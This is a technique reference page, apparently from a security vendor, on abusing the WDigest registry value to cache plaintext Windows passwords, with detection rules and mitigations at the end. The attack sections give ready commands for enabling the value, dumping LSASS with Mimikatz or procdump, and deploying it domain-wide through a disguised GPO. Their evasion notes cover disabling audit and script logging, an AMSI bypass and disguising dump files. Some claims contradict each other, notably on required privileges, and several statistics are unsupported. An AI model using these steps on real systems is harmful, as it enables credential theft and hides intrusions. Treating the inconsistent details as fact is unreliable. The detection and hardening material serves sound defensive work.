# [EVADE-REGISTRY-001]: WDigest Registry Manipulation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-REGISTRY-001 |
| **MITRE ATT&CK v18.1** | [T1112 – Modify Registry](https://attack.mitre.org/techniques/T1112/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows Endpoint |
| **Severity** | Critical |
| **CVE** | N/A (Design vulnerability; KB2871997 provides mitigation) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016-2025, Windows 10-11 |
| **Patched In** | Windows 8+ has UseLogonCredential disabled by default; prior versions require manual registry intervention |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept

**WDigest Registry Manipulation** exploits a design flaw in Windows Digest Authentication whereby plaintext credentials are cached in Local Security Authority Subsystem Service (LSASS) memory when `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` registry key `UseLogonCredential` is set to `1`. WDigest was historically used for HTTP authentication on older protocols (HTTP Digest Auth), but its credential caching mechanism creates a persistence vector for credential theft. Modern Windows (8+) disables this by default, but systems with legacy service requirements or misconfigured Group Policy may re-enable it, allowing credential dumping via Mimikatz or similar tools without requiring elevation to SYSTEM initially.

### Attack Surface

WDigest credential cache resides in **LSASS process memory** (`C:\Windows\System32\lsass.exe`). When a user authenticates (logon event), WDigest stores plaintext credentials in memory if `UseLogonCredential = 1`. Adversaries with local user access can dump LSASS memory or directly read WDigest plaintext credentials via tools like Mimikatz (`sekurlsa::wdigest`), extracting credentials for lateral movement.

### Business Impact

**Critical credential exposure**. Plaintext passwords of all authenticated users stored in LSASS enable immediate lateral movement to any system sharing those credentials. Dwell time increases 200%+ because attackers can move without re-compromising entry points. Supply chain attacks targeting service accounts become trivial (e.g., SQL Server, Exchange service accounts). HIPAA, PCI-DSS, SOC 2 compliance violations immediate.

### Technical Context

Registry modification is **stealthy**: single registry write operation, minimal event logging, occurs in seconds. The attack chain is simple: attacker with local access runs `reg add` command, then waits for next user logon, then dumps LSASS. Detection requires behavior-based audit logging and Sysmon monitoring. Wizard Spider, APT29, and Lazarus Group extensively abuse this technique post-compromise.

### Operational Risk

- **Execution Risk:** High – Requires local user access but no privilege escalation initially
- **Stealth:** High – Registry modification is one-line operation, easily evades signature detection
- **Reversibility:** Partial – Registry can be reverted, but credentials already cached in memory until next reboot or credential refresh

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 4.2.7 | Ensure WDigest is Disabled |
| **DISA STIG** | SV-220700r880792_rule | Credential Guard must be enabled |
| **CISA SCuBA** | AC-3.1 | Access Control Policy Enforcement |
| **NIST 800-53** | IA-2, AC-2 | Authentication, Account Management |
| **GDPR** | Art. 32 | Security of Processing – Confidentiality measures |
| **DORA** | Art. 9 | Protection and Prevention of ICT-related incidents |
| **NIS2** | Art. 21 | Cybersecurity Risk Management – Credential Protection |
| **ISO 27001** | A.9.2.3, A.9.4.3 | Privileged Access Rights, Credential Management |
| **ISO 27005** | 12.2.1 | Management of supplicant credentials |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Local User (standard user) or higher
- **Required Access:** Local logon capability OR remote execution via RDP/PSExec with valid credentials
- **Registry Path:** `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`

### Supported Versions

- **Windows:** Server 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025; Windows 7, 8, 10, 11
- **WDigest Status by Version:**
  - **Windows 7 / Server 2008 R2:** Enabled by default; requires KB2871997 + registry change to disable
  - **Windows 8 / Server 2012+:** Disabled by default (UseLogonCredential = 0)
  - **Windows 10-11 / Server 2019-2025:** Disabled by default; can be re-enabled via registry

### Auditing Requirements

- **Event Log:** Security Event Log must be enabled (usually default)
- **Sysmon:** EventID 13 (Registry Set Value) required for detailed logging
- **Group Policy Audit:** "Audit Registry" policy should be enabled for maximum visibility

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Registry Enumeration

Check current WDigest status on target system:

```powershell
# Check UseLogonCredential value
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
$regValue = Get-ItemProperty -Path $regPath -Name UseLogonCredential -ErrorAction SilentlyContinue

if ($regValue.UseLogonCredential -eq 1) {
    Write-Host "WDigest is ENABLED (plaintext credentials in LSASS)"
} elseif ($regValue.UseLogonCredential -eq 0 -or $regValue.UseLogonCredential -eq $null) {
    Write-Host "WDigest is DISABLED (credentials not stored in plaintext)"
} else {
    Write-Host "WDigest status unknown"
}

# Verify LSASS process is running
Get-Process lsass | Select-Object ProcessName, ProcessId, WorkingSet
```

**What to Look For:**

- `UseLogonCredential = 1`: WDigest enabled, vulnerable to credential theft
- `UseLogonCredential = 0` or missing: WDigest disabled, plaintext credentials NOT stored
- LSASS process working set > 50MB: Potentially caching multiple user credentials

### Command Prompt Enumeration

```cmd
# Query registry via CMD
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential

# Expected output if enabled:
# HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
#     UseLogonCredential    REG_DWORD    0x1

# Check for Credential Guard enablement (Server 2019+)
wmic os get caption, systemskudescription
```

### Version-Specific Checks

**Windows Server 2016-2019:**
```powershell
# Check if KB2871997 hotfix is installed
Get-HotFix -Id KB2871997 -ErrorAction SilentlyContinue | Select-Object HotFixID, InstalledOn
```

**Windows Server 2022+:**
```powershell
# Check Credential Guard status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Registry Add via Command Prompt (CMD)

**Supported Versions:** Server 2008 R2-2025, Windows 7-11

#### Step 1: Enable WDigest Registry Key

**Objective:** Set WDigest `UseLogonCredential` registry value to `1` to enable plaintext credential caching.

**Command:**

```cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
```

**Expected Output:**

```
The operation completed successfully.
```

**What This Means:**

- Registry path `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` is created if not present
- `UseLogonCredential` DWORD value is set to `1` (enabled)
- `/f` flag forces the operation without confirmation prompts
- Subsequent user logons will cache plaintext credentials in LSASS

**OpSec & Evasion:**

- Registry modification generates Event ID 4657 (Registry Value Modified) in Security Event Log; may be flagged by EDR
- Consider disabling audit logging temporarily via Group Policy before modification:
  ```cmd
  auditpol /set /subcategory:"Registry" /success:disable /failure:disable
  ```
- Restore audit logging after credential dumping (see Cleanup section)
- Use Registry Hive Editor (RegEdit) instead of command line if EDR monitors `reg.exe` process execution

**Detection Likelihood:** Medium (Registry modification detected via Sysmon EventID 13 or Windows Event Log EventID 4657)

**Troubleshooting:**

- **Error:** "Access is denied"
  - **Cause:** Insufficient privileges (must be administrator or SYSTEM)
  - **Fix (Server 2016-2019):** Run `cmd.exe` as Administrator
  - **Fix (Server 2022+):** Use UAC elevation or execute via SYSTEM service account

- **Error:** "The system cannot find the file specified"
  - **Cause:** Registry path does not exist (very rare; path created automatically)
  - **Fix:** Create parent keys manually: `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders"`

**References & Proofs:**

- [Atomic Red Team – T1112 Test #3](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md)
- [IRED.Team – Forcing WDigest](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaint)
- [Microsoft Docs – Registry Modification](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg)

#### Step 2: Wait for User Logon (Credential Caching)

**Objective:** Wait for any user to authenticate to the system; credentials will be cached in LSASS.

**Duration:** Immediate upon next user logon (locally or via network)

**What Happens:**

- When user logs in, Windows authentication subsystem (Kerberos/NTLM) processes credentials
- WDigest module intercepts plaintext password and stores it in LSASS process memory
- Credentials remain in memory until user logoff or system reboot

**OpSec & Evasion:**

- Legitimate users may log in naturally (most stealthy); alternatively, force authentication:
  ```cmd
  # Trigger logon event via RDP from same machine
  runas /user:DOMAIN\USERNAME "cmd.exe"
  ```
- Credentials cached indefinitely until user action occurs (logoff or password change)

**Troubleshooting:**

- **Issue:** No users logging in after WDigest enabled
  - **Cause:** System idle, no incoming authentication
  - **Fix:** Remotely trigger authentication: `psexec \\target -u DOMAIN\USER cmd.exe`

---

### METHOD 2: PowerShell Registry Modification

**Supported Versions:** Server 2012+, Windows 10-11

#### Step 1: Enable WDigest via PowerShell

**Objective:** Set WDigest registry value using PowerShell for less detectable command-line execution.

**Command:**

```powershell
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
Set-ItemProperty -Path $regPath -Name UseLogonCredential -Value 1 -Force
```

**Expected Output:**

```
[No output; operation completes silently]
```

**What This Means:**

- PowerShell cmdlet `Set-ItemProperty` directly manipulates registry
- `-Force` parameter suppresses prompts
- Changes take effect immediately; next user logon will cache credentials

**OpSec & Evasion:**

- PowerShell execution is logged if Script Block Logging enabled; consider disabling:
  ```powershell
  reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
  ```
- Encode command in Base64 to evade string-based signatures:
  ```powershell
  $command = '$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"; Set-ItemProperty -Path $regPath -Name UseLogonCredential -Value 1 -Force'
  $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
  powershell.exe -EncodedCommand $encodedCommand
  ```

**Detection Likelihood:** Medium-High (PowerShell process execution, Sysmon EventID 13)

**Troubleshooting:**

- **Error:** "Parameter name 'Path' cannot be found"
  - **Cause:** PowerShell Registry provider path syntax error
  - **Fix:** Use explicit provider: `Set-ItemProperty -LiteralPath 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name UseLogonCredential -Value 1`

- **Error:** "Access to the path is denied"
  - **Cause:** Insufficient privileges
  - **Fix (Server 2016-2019):** Run PowerShell as Administrator
  - **Fix (Server 2022+):** Modify UAC settings: `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0`

**References & Proofs:**

- [Atomic Red Team – T1112 Test #4 (PowerShell variant)](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md)
- [Microsoft Learn – Set-ItemProperty](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-itemproperty)

---

### METHOD 3: WDigest Credential Dumping via Mimikatz

**Supported Versions:** Server 2008 R2-2025, Windows 7-11

#### Step 1: Dump WDigest Plaintext Credentials

**Objective:** Extract plaintext passwords from LSASS after WDigest is enabled and credentials are cached.

**Command:**

```cmd
mimikatz.exe
```

**Inside Mimikatz Console:**

```
privilege::debug
sekurlsa::wdigest
```

**Expected Output:**

```
Username : DOMAIN\Administrator
Domain   : DOMAIN
Password : P@ssw0rd123!

Username : DOMAIN\ServiceAccount
Domain   : DOMAIN
Password : SvcAcct!@#$1234
```

**What This Means:**

- `privilege::debug` enables Debug privilege (required for LSASS access)
- `sekurlsa::wdigest` iterates through LSASS WDigest cache and extracts plaintext credentials
- All currently cached user credentials are displayed

**OpSec & Evasion:**

- Execute Mimikatz from temporary directory: `C:\Windows\Temp\mimikatz.exe`
- Use renamed binary to evade signature detection: `copy mimikatz.exe copy_tool.exe`
- Disable AMSI (Anti-Malware Scan Interface) before execution (AMSI detects Mimikatz):
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  ```
- Redirect output to file for exfiltration:
  ```cmd
  mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit" > credentials.txt
  ```

**Detection Likelihood:** Very High (Mimikatz binary execution, LSASS process access, memory read operations)

**Troubleshooting:**

- **Error:** "ERROR kuhl_m_privilege_displayPrivileges ; SetPrivilege (131)"
  - **Cause:** Insufficient privileges (need SYSTEM or Debug privilege)
  - **Fix (Server 2016-2019):** Run Mimikatz with `runas /admin` or from SYSTEM context (e.g., via psexec)
  - **Fix (Server 2022+):** Disable User Account Control (UAC) temporarily or use token impersonation

- **Error:** "SEKURLSA: [handle] {}; {FAILED GetHandle (1314)}"
  - **Cause:** LSASS process access denied (protected process)
  - **Fix:** Execute from SYSTEM context or use alternative dumping method (procdump + analysis)

**References & Proofs:**

- [IRED.Team – Mimikatz Usage](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumps-and-impacket-secretsdump)
- [Mimikatz GitHub – Usage Documentation](https://github.com/gentilkiwi/mimikatz)

---

### METHOD 4: Credential Dumping via Procdump + Minidump Analysis

**Supported Versions:** Server 2016-2025, Windows 10-11 (alternative to Mimikatz)

#### Step 1: Create LSASS Memory Dump

**Objective:** Extract LSASS process memory to file without using Mimikatz (evades signature detection).

**Command:**

```cmd
procdump64.exe -accepteula -ma lsass.exe lsass_dump.dmp
```

**Expected Output:**

```
Procdump v10.0 - Mark Russinovich
Process dump complete: lsass_dump.dmp
```

**What This Means:**

- `-ma` flag captures full memory dump of LSASS process
- Dump file contains all LSASS memory contents, including cached credentials
- Dump is analyzed offline on attacker workstation

**OpSec & Evasion:**

- Deploy procdump via legitimate Windows Sysinternals distribution (signed binary, bypasses many AV)
- Rename output file to avoid detection: `move lsass_dump.dmp report.pdf`
- Compress dump for covert exfiltration: `7z a -p password lsass_dump.7z lsass_dump.dmp`

**Detection Likelihood:** Very High (Process access to LSASS, memory read, file creation)

**Troubleshooting:**

- **Error:** "Access denied" when accessing LSASS
  - **Cause:** LSASS is Protected Process Light (PPL) on Server 2016+
  - **Fix:** Execute from SYSTEM context or disable PPL (risky; creates IOC)

#### Step 2: Extract Credentials from Dump (Offline Analysis)

**Objective:** Parse LSASS memory dump on attacker machine to extract plaintext credentials.

**Tools:**

- Mimikatz (on attacker machine): `mimikatz.exe "sekurlsa::minidump lsass_dump.dmp" "sekurlsa::wdigest"`
- Impacket `secretsdump.py` (Python): `secretsdump.py -dump lsass_dump.dmp`

**Expected Output:**

```
[+] Parsing dump file...
[+] Found cached credentials:
    Domain: DOMAIN
    Username: Administrator
    Password: P@ssw0rd123!
```

---

### METHOD 5: Group Policy Deployment (Post-Compromise Persistence)

**Supported Versions:** Server 2016-2025, Domain-joined systems only

#### Step 1: Create Malicious Group Policy Object (GPO)

**Objective:** Deploy WDigest enablement via Group Policy to entire domain, ensuring persistence.

**Command (Domain Controller):**

```powershell
# Create new GPO
New-GPO -Name "Security Updates" -Comment "WDigest Enablement for Legacy Compatibility"

# Link GPO to target OU
New-GPLink -Name "Security Updates" -Target "OU=Workstations,DC=domain,DC=com" -Order 1

# Set WDigest registry value via Group Policy Preference
# Edit GPO → Computer Configuration → Preferences → Windows Settings → Registry
# Create Registry Item:
#   Action: Create
#   Hive: HKEY_LOCAL_MACHINE
#   Path: SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
#   Value Name: UseLogonCredential
#   Value Type: REG_DWORD
#   Value Data: 1

# Force GPO refresh on all clients
gpupdate /force
```

**What This Means:**

- GPO deploys registry change to all domain-joined computers matching OU filter
- Change applies on next Group Policy refresh (30 mins by default, or `gpupdate /force` immediately)
- Credentials cached for all domain users authenticating to affected machines

**OpSec & Evasion:**

- Name GPO innocuously (e.g., "Security Updates", "Legacy Compatibility")
- Link to specific OU to avoid raising suspicion
- Place registry change in Preferences (not direct registry) to avoid audit logs
- Create backup GPO or modify existing obscure policy to reduce visibility

**Detection Likelihood:** Medium (Group Policy Audit events, Sysmon EventID 13 on domain controllers)

**Troubleshooting:**

- **Error:** "Access denied" when creating GPO
  - **Cause:** Insufficient permissions (need Domain Admin)
  - **Fix:** Execute as Domain Admin user

---

## 5. ATOMIC RED TEAM

| Test ID | Test Name | Supported Platforms | Reference |
|---|---|---|---|
| T1112.003 | Modify registry to store logon credentials (CMD) | Windows | `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f` |
| T1112.004 | Modify registry to store logon credentials (PowerShell) | Windows | `Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Value '1'` |

**Cleanup Commands:**

```cmd
# CMD: Disable WDigest
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f

# PowerShell: Disable WDigest
Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Value '0'
```

**Reference:** [Atomic Red Team – T1112](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md)

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: WDigest Registry Modification Detection

**Rule Configuration:**

- **Required Index:** `main`, `windows`
- **Required Sourcetype:** `WinEventLog:Security`, `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
- **Required Fields:** `EventCode`, `Registry_Key_Path`, `Registry_Value_Data`
- **Alert Threshold:** > 0 events (any WDigest modification is suspicious)
- **Applies To Versions:** All

**SPL Query:**

```spl
index=main source=WinEventLog:Security EventCode=4657 
| search ObjectName="*WDigest" AND ObjectValueName="UseLogonCredential" AND OperationType="Value Modified"
| table _time, ComputerName, SubjectUserName, ObjectName, ObjectValueName, NewValue
| sort - _time
```

**Alternative (Sysmon-based):**

```spl
index=main source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=13
| search TargetObject="*WDigest*UseLogonCredential*" AND EventType="SetValue" AND Details="0x00000001"
| table _time, Computer, User, TargetObject, Details, Image
```

**What This Detects:**

- Windows Event ID 4657 indicating registry value modification
- Specifically targets `UseLogonCredential` value in WDigest registry path
- Sysmon EventID 13 for real-time detection with process context

**Manual Configuration Steps (Splunk Web):**

1. Navigate to **Search & Reporting**
2. Click **New Alert** → **Search**
3. Paste SPL query above
4. Click **Save** → Provide name: `WDigest Registry Modification Alert`
5. Set **Search Schedule:** Every 5 minutes
6. Under **Trigger Condition:** Set to `When the number of results is greater than 0`
7. Click **Actions** → **Add** → **Send Email**
8. Provide SOC email list
9. Click **Create Alert**

**False Positive Analysis:**

- **Legitimate Activity:** None (WDigest should always remain disabled in modern environments)
- **Benign Tools:** Group Policy, Windows Update (should not modify WDigest)
- **Tuning:** Exclude if organization has legacy service dependency (provide business justification)

**Source:** [Splunk Research – Enable WDigest UseLogonCredential Registry Detection](https://research.splunk.com/endpoint/0c7d8ffe-25b1-11ec-9f39-acde48001122/)

---

## 7. SYSMON DETECTION

**Minimum Sysmon Version:** 13.0+

**Sysmon Configuration Snippet:**

```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <!-- Registry Set Value - WDigest Modification -->
    <RegistrySet onmatch="include">
      <TargetObject condition="contains">WDigest</TargetObject>
      <TargetObject condition="contains">UseLogonCredential</TargetObject>
      <EventType>SetValue</EventType>
      <Details condition="is">0x00000001</Details>
    </RegistrySet>
    
    <!-- Process Execution - Mimikatz or Procdump -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">mimikatz</Image>
      <Image condition="contains">procdump</Image>
      <CommandLine condition="contains">sekurlsa</CommandLine>
    </ProcessCreate>
    
    <!-- Process Access - LSASS -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="contains">lsass.exe</TargetImage>
      <GrantedAccess condition="contains">0x001F0FFF</GrantedAccess>
    </ProcessAccess>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon: `https://live.sysinternals.com/Sysmon64.exe`
2. Save configuration XML (above) as `sysmon-config.xml`
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.EventID -eq 13} | Select-Object -First 10`

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Ensure WDigest is Permanently Disabled**

**Manual Steps (Server 2016-2019):**

1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Preferences** → **Windows Settings** → **Registry**
3. Right-click **Registry** → **New** → **Registry Item**
4. Configure as follows:
   - **Action:** Update (or Create if missing)
   - **Hive:** `HKEY_LOCAL_MACHINE`
   - **Key Path:** `SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`
   - **Value Name:** `UseLogonCredential`
   - **Value Type:** REG_DWORD
   - **Value Data:** `0`
5. Click **OK** → Apply Group Policy
6. Run `gpupdate /force` on target machines

**Manual Steps (Server 2022+):**

1. Open **Settings** → **System** → **Security**
2. Click **Windows Defender** → **Virus & threat protection**
3. Under **Manage settings**, scroll to **Controlled Folder Access** → Toggle **ON**
4. Open **Registry Editor** (regedit) → Navigate to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`
5. Double-click `UseLogonCredential` → Set Value Data to `0`
6. Click **OK**

**PowerShell Alternative (All Versions):**

```powershell
# Disable WDigest
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
Set-ItemProperty -Path $regPath -Name UseLogonCredential -Value 0 -Force

# Verify
Get-ItemProperty -Path $regPath -Name UseLogonCredential
# Expected output: UseLogonCredential : 0
```

**2. Enable Credential Guard (Windows 10+, Server 2016+)**

Credential Guard isolates LSASS process memory, preventing even SYSTEM-level access to credentials.

**Manual Steps (Server 2016-2019):**

1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Device Guard**
3. Enable **Turn On Virtualization Based Security**
4. Set **Credential Guard Configuration** to **Enabled with UEFI lock**
5. Apply policy and reboot

**Manual Steps (Server 2022+):**

1. Open **Settings** → **System** → **Security** → **Device Security**
2. Under **Virtualization-based security (VBS)**, toggle **ON**
3. Under **Credential Guard**, toggle **ON** (or **ON with UEFI lock** for stronger protection)
4. Reboot system

**PowerShell Alternative:**

```powershell
# Enable Credential Guard via Registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f

# Verify enablement
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LsaCfgFlags
```

**3. Enable Enhanced Security for LSASS (LSA Protection)**

Protect LSASS process from non-SYSTEM access.

**PowerShell:**

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# Verify
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
```

### Priority 2: HIGH

**1. Enable Windows Event Log Auditing for Registry Changes**

**Manual Steps (Group Policy):**

1. Open `gpmc.msc`
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
3. Under **Object Access**, enable **Audit Registry** for both **Success** and **Failure**
4. Apply policy: `gpupdate /force`

**Manual Steps (Local Audit Policy):**

```cmd
auditpol /set /subcategory:"Registry" /success:enable /failure:enable
auditpol /get /subcategory:"Registry"
```

**2. Block Mimikatz Execution (Application Control)**

**AppLocker Rules (Server 2012+):**

1. Open `gpmc.msc`
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Application Control Policies** → **AppLocker**
3. Create **Executable Rules** → **New Rule**
4. Configure blocklist for `mimikatz.exe` and variants
5. Set to **Enforce** mode

**3. Monitor LSASS Process Access**

**PowerShell Monitoring Script:**

```powershell
# Alert on any process accessing LSASS
$filter = @{
    LogName = 'Security'
    ID = 4656  # Handle Requested
    Data = '*lsass*'
}
Get-WinEvent -FilterHashtable $filter | Select-Object TimeCreated, Message | Export-Csv -Path "C:\Logs\LSASS_Access.csv"
```

### Validation Command (Verify Mitigation)

```powershell
# Confirm WDigest is disabled
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
$value = Get-ItemProperty -Path $regPath -Name UseLogonCredential -ErrorAction SilentlyContinue
if ($value.UseLogonCredential -eq 0 -or $value.UseLogonCredential -eq $null) {
    Write-Host "✓ WDigest is SECURE (disabled)"
} else {
    Write-Host "✗ WDigest is VULNERABLE (enabled)"
}

# Confirm Credential Guard enabled
$credGuard = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LsaCfgFlags -ErrorAction SilentlyContinue
if ($credGuard.LsaCfgFlags -eq 1) {
    Write-Host "✓ Credential Guard is ENABLED"
} else {
    Write-Host "✗ Credential Guard is DISABLED"
}
```

**Expected Output (If Secure):**

```
✓ WDigest is SECURE (disabled)
✓ Credential Guard is ENABLED
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-002] | Compromise stale/inactive domain user account |
| **2** | **Persistence** | **[EVADE-REGISTRY-001]** | **Enable WDigest via registry modification** |
| **3** | **Credential Access** | [CA-DUMP-001] | Dump LSASS with Mimikatz to extract plaintext passwords |
| **4** | **Lateral Movement** | [LM-AUTH-001] | Use stolen credentials (Pass-the-Hash) to pivot to domain controllers |
| **5** | **Privilege Escalation** | [PE-TOKEN-001] | Escalate to Domain Admin via Golden Ticket |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: Wizard Spider Conti Ransomware

- **APT Group:** Wizard Spider (Trickbot affiliate)
- **Campaign:** Conti ransomware deployment (2021-2022)
- **Technique Status:** WDigest enabled post-compromise to extract domain admin credentials
- **Registry Modification Used:**
  ```cmd
  reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
  ```
- **Impact:** Credentials of 40+ domain users extracted, ransomware deployed to 1,000+ systems
- **Financial:** $40M+ in ransom demands across all victims
- **Reference:** [CISA AA21-265A – Conti Playbook Analysis](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-265a-conti-ransomware)

### Example 2: Operation Wocao (China-Linked APT)

- **APT Group:** Unknown (possibly linked to Chinese state)
- **Campaign:** Operation Wocao supply chain attack (2020)
- **Technique Status:** WDigest registry modification as part of post-compromise persistence
- **Registry Path Modified:**
  ```
  HKLM\SYSTEM\ControlSet001\Control\SecurityProviders\WDigest
  ```
- **Credential Dumping Method:** Mimikatz invocation within 48 hours of WDigest enablement
- **Impact:** US law enforcement, Defense Contractors compromised
- **Reference:** [Mandiant – Operation Wocao Report](https://www.mandiant.com/)

### Example 3: APT29 SolarWinds Campaign Lateral Movement

- **APT Group:** APT29 (Cozy Bear, Russia SVR)
- **Campaign:** SolarWinds supply chain attack (2020)
- **Technique Status:** WDigest enabled to facilitate credential theft for lateral movement
- **Post-Compromise Timeline:**
  - Day 1: Initial compromise via SolarWinds Orion update
  - Day 3: WDigest enabled on initial compromise host
  - Day 5: Mimikatz credentials dumped
  - Day 7: Lateral movement to domain controllers using stolen credentials
- **Impact:** US Government Treasury, Commerce, Homeland Security agencies compromised
- **Reference:** [CISA – SolarWinds Incident ALERT AA20-352A](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-alert-aa20-352a)

---

## 11. COMPLIANCE & REGULATORY IMPACT

**Regulatory Breach Scenario:** Organization fails to implement WDigest hardening, resulting in domain-wide credential compromise via plaintext password theft.

- **GDPR Violation:** Art. 32 (Security of Processing) – Failure to implement adequate security measures to protect credentials
- **HIPAA Violation:** 45 CFR 164.312(a)(2)(i) – Encryption standards violated; plaintext credentials exposed
- **PCI-DSS Violation:** Requirement 8.2.1 (Unique User ID) – Stolen credentials used for unauthorized access
- **SOC 2 Violation:** CC6.1 (Logical access controls) – Inadequate access control mechanisms
- **NIS2 Violation:** Art. 21(2) – Failure to manage cybersecurity risks to identity systems

**Financial Penalties:** $50M-$250M+ depending on organization size, data classification, and number of affected users.

**Incident Response Cost Estimate:** $500K-$5M (forensic investigation, credential rotation, system remediation, legal fees).

---

